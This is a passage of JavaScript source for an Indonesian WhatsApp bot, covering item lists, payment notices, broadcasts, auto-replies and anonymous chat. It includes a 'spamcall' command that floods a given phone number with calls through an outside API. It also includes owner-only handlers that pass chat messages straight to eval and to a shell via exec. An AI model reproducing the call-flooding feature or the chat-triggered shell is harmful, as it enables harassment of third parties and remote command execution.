            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            if (/image/.test(mime)) {
              let media = await liaacans.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        m.reply(`Sukses set list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                addResponList(m.chat, args1, args2, false, '-', db_respon_list)
                m.reply(`Sukses set list message dengan key : *${args1}*`)
            }
            break
        case 'delitem':
        if (cekUser("id", m.sender) == null) throw mess.user
            if (!m.isGroup) throw `Perintah Ini Khusus Group`
            if (!isAdmins && !isCreator) return m.reply('Only Admins')
            if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
            if (!q) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml`)
            if (!isAlreadyResponList(m.chat, q, db_respon_list)) return reply(`List Item dengan Nama *${q}* tidak ada di database!`)
            delResponList(m.chat, q, db_respon_list)
            m.reply(`Sukses delete list message dengan key *${q}*`)
            break
        case 'changeitem': case 'change':
        if (cekUser("id", m.sender) == null) throw mess.user
            if (!m.isGroup) throw `Perintah Ini Khusus Grup`
            if (!isAdmins && !isCreator) return m.reply('Only Admins')
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml@List`)
            if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
            if (/image/.test(mime)) {
                let media = await liaacans.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
              const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        m.reply(`Sukses update list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
                m.reply(`Sukses update respon list dengan key *${args1}*`)
            }
            break
case 'proses':
            if (!m.isGroup) return
            if (!isCreator) return
            if (!m.quoted) return m.reply('Reply Bukti Pembayaran!!')
            if (!text) return m.reply('Masukan Catatan Pelanggan\nContoh: proses 11 Diamond Ml | Id 12345678(1234)')
            let numb = m.sender
            let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${text}\n\nPesanan @${numb.split("@")[0]} sedang di proses!`
            mentions(proses, numb, true)
            m.quoted.copyNForward(`6285737134572@s.whatsapp.net`, true)
            liaacans.sendMessage(`6285737134572@s.whatsapp.net`, {text: proses })
            break
        case 'done':
            if (!isCreator) return
            if (args.length == 1) return m.reply('Masukan Nomor Pelanggan\nContoh: done 62xxx|catatan')
            if (args.length == 2) return m.reply('Masukan Catatan Transaksi')
            if (args[1].includes('+')) return m.reply(`Jangan menggunakan +`)
            if (isNaN(parseInt(args[1]))) return m.reply('Harus Berupa Angka!')
            let numbb = `${args[1]}@s.whatsapp.net`             
            let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\n📝 Catatan :\n${args[2]}\n\nTerimakasih @${numbb.split("@")[0]} Next Order ya🙏`
            liaacans.sendMessage(`${args[1]}@s.whatsapp.net`, {text: sukses })
            break
case 'infogempa':
if (cekUser("id", m.sender) == null) throw mess.user
fetchJson(`https://saipulanuar.ga/api/info/gempa?apikey=jPHjZpQF`)
.then(xg =>{
m.reply(`*INFO GEMPA*

*tanggal:* ${xg.result.tanggal}
*jam:* ${xg.result.jam}
*datetime:* ${xg.result.datetime}
*coordinates:* ${xg.result.coordinates}
*lintang:* ${xg.result.lintang}
*bujur:* ${xg.result.bujur}
*magnitude:* ${xg.result.magnitude}
*kedalaman:* ${xg.result.kedalaman}
*wilayah:* ${xg.result.wilayah}
*potensi:* ${xg.result.potensi}
*dirasakan:* ${xg.result.dirasakan}`)
})
break
case 'ssweb-pc':
case 'ssweb-hp':{
if (cekUser("id", m.sender) == null) throw mess.user
if (!q) return m.reply(`Masukan parameter url\n*Contoh:*\n${prefix+command} https://google.com`)
m.reply(mess.wait)
let anu =`https://leyscoders-api.herokuapp.com/api/${command}?url=${q}&apikey=IkyOgiwara`
liaacans.sendMessage(m.chat, { image: {url: anu}, caption: 'Done!'}, {quoted:m})
}
break
case 'sewabot': {
if (cekUser("id", m.sender) == null) throw mess.user
sewabot = `⌜  LIST SEWA KIZU BOT ⌟

HARGA :
RP 5.000 → 20 DAY
RP 10.000 → 30 DAY
RP 25.000 → PERMANEN

APA ITU DAY? DAY ITU ADALAH HARI!

⌜ KEUNTUNGAN SEWA KIZU BOT ⌟

→ BISA ADD BOT 1 GROUP
→ BISA GUNAIN FITUR ADMIN
→ BISA MENJAGA GROUP, JIKA ADMIN GROUP SIBUK

MINAT SEWA BOT?
HUBUNGI OWNER BOT!
KETIK .owner`
let buttons = [{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, sewabot, creator)
}
break
case 'spamcall':{
if (!isPremium) throw mess.prem
if (!q) return m.reply(`Kirim perintah\n#${command} nomor\n\nContoh? #${command} 8xxxx\nNomor awal dari 8 bukan 62/08`)
var data = await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=${q}`).catch(() => m.reply(mess.error.api))
if (data.status == false) {
m.reply(data.msg)
} else {
m.reply(data.logs)
}
}
break
case 'readmore': case 'more':
if (cekUser("id", m.sender) == null) throw mess.user
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
 if (!q.includes('|')) return  m.reply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
m.reply( text1 + readmore + text2)
break
case 'sound1':case 'sound2':
case 'sound3':case 'sound4':case 'sound5':case 'sound6':
case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':
case 'sound15':case 'sound16':case 'sound17':case 'sound18':
case 'sound19':case 'sound20':case 'sound21':case 'sound22':
case 'sound23':case 'sound24':case 'sound25':case 'sound26':
case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':
case 'sound35':case 'sound36':case 'sound37':case 'sound38':
case 'sound39':case 'sound40':case 'sound41':case 'sound42':
case 'sound43':case 'sound44':case 'sound45':case 'sound46':
case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':
case 'sound55':case 'sound56':case 'sound57':case 'sound58':
case 'sound59':case 'sound60':case 'sound61':case 'sound62':
case 'sound63':case 'sound64':case 'sound65':case 'sound66':
case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74':
if (cekUser("id", m.sender) == null) throw mess.user
m.reply(mess.wait)
var inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`)
liaacans.sendMessage(m.chat, {audio:inicdd, mimetype:'audio/mpeg', ptt:true}, {quoted: fvn})
break
//Random Wibu
case 'waifu':
case 'loli':
case 'husbu':
case 'milf':
case 'cosplay':
case 'wallml':{
if (!isPremium) throw mess.prem
m.reply(mess.wait)
let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
let random = eek[Math.floor(Math.random() * eek.length)]
liaacans.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: kafloc })
}
break
// BROADCAST
case 'bctext':{
if (!isCreator) throw mess.owner
if (!q) return m.reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
let db_orang = JSON.parse(fs.readFileSync('./json/user.json'));
let data_teks = `${q}`
for (let i of db_orang){ 
var button_broadcast = {text: data_teks, footer: '©broadcast', buttons: [{ buttonId: '!menu', buttonText: {displayText: '⋮☰ 𝗠𝗘𝗡𝗨'}, type: 1}],headerType: 1}
liaacans.sendMessage(i.id, button_broadcast)
await sleep(2000)
}
m.reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`)
}
break
case 'bcvideo':{
if (!isCreator) throw mess.owner
if (isVideo || isQuotedVideo){
await liaacans.downloadAndSaveMediaMessage(m, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
m.reply(mess.wait)
var bc_video = `./sticker/${setting.ownerNumber.split('@')[0]}.mp4`
for (let i of db_user){
liaacans.sendMessage(i.id, {video:{url:bc_video}, caption:'*©broadcast*'})
await sleep(2000)
}
m.reply(`*Sukses mengirim broadcast video ke ${db_user.length} user*`)
fs.unlinkSync(bc_video)
} else {
m.reply(`*kirim video dengan caption ${prefix+command} atau reply video dengan pesan ${prefix+command}*`)
}
}
break
case 'bcimage':{
if (!isCreator) throw mess.owner
if (isImage || isQuotedImage){
await liaacans.downloadAndSaveMediaMessage(m, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
m.reply(mess.wait)
var bc_image = `./sticker/${setting.ownerNumber.split('@')[0]}.jpg`
for (let i of db_user){
liaacans.sendMessage(i.id, {image:{url:bc_image}, caption:'*©broadcast*'})
await sleep(2000)
}
m.reply(`*Sukses mengirim broadcast image ke ${db_user.length} user*`)
fs.unlinkSync(bc_image)
} else {
m.reply(`*kirim gambar dengan caption ${prefix+command} atau reply gambar dengan pesan ${prefix+command}*`)
}
}
break
case 'bcaudio':{
if (!isCreator) throw mess.owner
if (isQuotedAudio){
await liaacans.downloadAndSaveMediaMessage(m, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
m.reply(mess.wait)
var bc_audio = `./sticker/${setting.ownerNumber.split('@')[0]}.mp3`
for (let i of db_user){
liaacans.sendMessage(i.id, {audio:{url:bc_audio}, mimetype:'audio/mpeg', fileName:'bcaudio.mp3'})
await sleep(2000)
}
m.reply(`*Sukses mengirim broadcast audio ke ${db_user.length} user*`)
fs.unlinkSync(bc_audio)
} else {
m.reply(`*reply audio dengan pesan ${prefix+command}*`)
}
}
break
case 'bc':
case 'siaran':
case 'broadcast':
if (!isCreator) throw mess.owner
m.reply(`*BROADCAST*

*Type Text*
*Example:* 
#bctext <text>

*Type Audio*
*Example:*
#bcaudio <reply audio>

*Type Video*
*Example:*
#bcvideo <reply video>

*Type Image*
*Example:*
#bcimage <reply image>

_Broadcast › Chat All User_`)
break

//---------------[ AUTO RESPON ]------------------//

case 'Dika':{
m.reply(`apasi manggil² owner bot? kangen ya??`)
}
break
case 'mwachh':{
m.reply(`mwachhh😘`)
}
break
case 'assalamualaikum':{
ucslm = `Waalaikumsalam Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, ucslm, creator)
}
break
case 'hai': {
hai = `Hai Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, hai, creator)
}
break
case 'hi': {
hai = `Hi Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, hai, creator)
}
break
case 'hii': {
hai = `Hii Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, hai, creator)
}
break
case 'halo':{
halo = `Halo Kak ${pushname}
Ada Yang Kami Bisa Bantu?
Kalau Bingung Ketik #menu Atau Klik Button Ya!`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, halo, creator)
}
break
case 'sayang':{
m.reply(`apa sayang akuu🥰`)
}
break
//━━━━━━━━━━━━━━━[ AKHIR FITUR ]━━━━━━━━━━━━━━━━━//

default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

// KITA SEMBUNYIKAN AUTO REAC NYA, NNTI TERGNGGU OLEH USER LAIN:V
/*if (budy.includes('gabut') || budy.includes('hehe') || budy.includes('apa') || budy.includes('hai') || budy.includes('apasi') || budy.includes('rahman') || budy.includes('man') || budy.includes('dahlah') || budy.includes('sepi') || budy.includes('🗿') || budy.includes('menu')) {
	let mojii = ["🤧","🤨","🗿","🤪","🤫","🤬","🤭","🤮","🤯","🤟","🤠","🤡","🤢","🤣","🤤","🤥","🤐","🤑","🤒","🤓","🤔","🤕","🤖","🤗", "🥰","😍","😘","❤️","🤩"]
			let ran = mojii[Math.floor(Math.random() * mojii.length)]
const reactionMessage = {
    react: {
        text: ran, // use an empty string to remove the reaction
        key: m.key
    }
}
liaacans.sendMessage(m.chat, reactionMessage)
}*/

/*if (budy.includes('menfess') || budy.includes('confess') || budy.includes('menfes') || budy.includes('confes') || budy.includes('confirm')) {
   let eemmojjii = ["🗿","🤣","🤭","😎","🥰","😍","😇"]
   let iniemoji = eemmojjii[Math.floor(Math.random() * eemmojjii.length)]
   const reactionMessage = {
         react: {
              text: iniemoji,
              key: m.key
     }
}

liaacans.sendMessage(m.chat, reactionMessage)
	}*/

if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
                
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return m.reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
}
			
if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
lm.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}
			
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
liaacans.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}
        

} catch (err) {
m.reply(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
